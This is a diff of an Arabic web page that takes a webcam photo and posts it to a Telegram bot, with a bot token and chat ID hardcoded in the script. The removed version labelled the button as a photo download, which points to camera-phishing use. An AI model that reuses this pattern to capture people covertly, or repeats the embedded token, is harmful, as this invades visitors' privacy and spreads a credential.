@@ -1,18 +1,217 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
- <meta charset="UTF-8">
- <meta name="viewport" content="width=device-width, initial-scale=1.0">
- <title>Camera Capture and Send to Telegram</title>
- <link rel="stylesheet" href="styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تصوير وإرسال إلى تلغرام</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+        }
+
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        button {
+            padding: 10px 20px;
+            margin: 5px;
+            border: none;
+            border-radius: 5px;
+            background-color: #007BFF;
+            color: white;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        video {
+            background-color: #000;
+            margin-bottom: 10px;
+            width: 100%;
+            max-width: 640px;
+            border-radius: 8px;
+            display: none;
+        }
+
+        .status {
+            margin-top: 10px;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+        }
+
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+        }
+
+        .info {
+            background-color: #d1ecf1;
+            color: #0c5460;
+        }
+    </style>
 </head>
 <body>
- <div class="container">
- <h1>Camera Capture</h1>
- <button id="startCapture">Appuyez pour télécharger les photos</button>
- <video id="video" width="640" height="480" autoplay></video>
- <canvas id="canvas" style="display:none;"></canvas>
- </div>
- <script src="script.js"></script>
+    <div class="container">
+        <h1>📸 تصوير وإرسال إلى تلغرام</h1>
+        <button id="startCapture">📷 تصويري وإرساله إلى تلغرام</button>
+        <video id="video" width="640" height="480" autoplay></video>
+        <canvas id="canvas" style="display:none;"></canvas>
+        <div id="status" class="status info">⚡ جاهز - اضغط على الزر</div>
+    </div>
+
+    <script>
+        // ==========================================
+        // 🔐 التوكن ومعرف الدردشة مخزنين هنا فقط
+        // غيرهم من هنا إذا أردت التعديل
+        // ==========================================
+        const BOT_TOKEN = "7323434162:AAHNE_LwznKc2CCOehy7bwWMliqccgIguU4";  // ضع توكن بوتك هنا
+        const CHAT_ID = "6414801160";  // ضع معرف الدردشة هنا
+        // ==========================================
+
+        const startCapture = document.getElementById('startCapture');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const statusDiv = document.getElementById('status');
+
+        let stream = null;
+        let hasPermission = false;
+
+        function showStatus(message, type) {
+            statusDiv.innerHTML = message;
+            statusDiv.className = `status ${type}`;
+        }
+
+        // طلب الكاميرا
+        async function requestCamera() {
+            if (hasPermission && stream) return true;
+
+            try {
+                showStatus('📷 جاري طلب الوصول إلى الكاميرا...', 'info');
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                video.style.display = 'block';
+                hasPermission = true;
+                showStatus('✅ تم الوصول إلى الكاميرا! جاري التصوير...', 'success');
+                return true;
+            } catch(error) {
+                let msg = '❌ فشل الوصول للكاميرا: ';
+                if (error.name === 'NotAllowedError') msg += 'لقد رفضت الإذن';
+                else if (error.name === 'NotFoundError') msg += 'لا توجد كاميرا';
+                else msg += error.message;
+                showStatus(msg, 'error');
+                return false;
+            }
+        }
+
+        // التقاط الصورة وإرسالها
+        async function captureAndSend() {
+            if (!hasPermission || !stream) {
+                showStatus('❌ لا توجد صلاحية للكاميرا', 'error');
+                return false;
+            }
+
+            try {
+                showStatus('📸 جاري التصوير...', 'info');
+                
+                // التقاط الصورة
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                showStatus('📤 جاري الإرسال إلى تلغرام...', 'info');
+                
+                // تحويل إلى Blob
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
+                
+                // إرسال إلى تلغرام
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
+                formData.append('caption', `📸 تم التصوير من المتصفح\n🕐 ${new Date().toLocaleString('ar-EG')}`);
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    showStatus('✅ تم إرسال الصورة بنجاح إلى تلغرام!', 'success');
+                    
+                    // إيقاف الكاميرا بعد الإرسال
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                        stream = null;
+                        hasPermission = false;
+                        video.style.display = 'none';
+                    }
+                    return true;
+                } else {
+                    throw new Error(data.description);
+                }
+            } catch(error) {
+                let msg = '❌ فشل الإرسال: ';
+                if (error.message.includes('401')) msg += 'توكن البوت غير صحيح';
+                else if (error.message.includes('400')) msg += 'معرف الدردشة غير صحيح';
+                else msg += error.message;
+                showStatus(msg, 'error');
+                return false;
+            }
+        }
+
+        // زر واحد: طلب الكاميرا + تصوير + إرسال
+        startCapture.onclick = async () => {
+            startCapture.disabled = true;
+            startCapture.innerHTML = '⏳ جاري...';
+            
+            const cameraOk = await requestCamera();
+            if (!cameraOk) {
+                startCapture.disabled = false;
+                startCapture.innerHTML = '📷 تصويري وإرساله إلى تلغرام';
+                return;
+            }
+            
+            // انتظار قليل لتثبيت الفيديو
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            await captureAndSend();
+            
+            startCapture.disabled = false;
+            startCapture.innerHTML = '📷 تصويري وإرساله إلى تلغرام';
+        };
+
+        // تنظيف عند إغلاق الصفحة
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
 </body>
 </html>
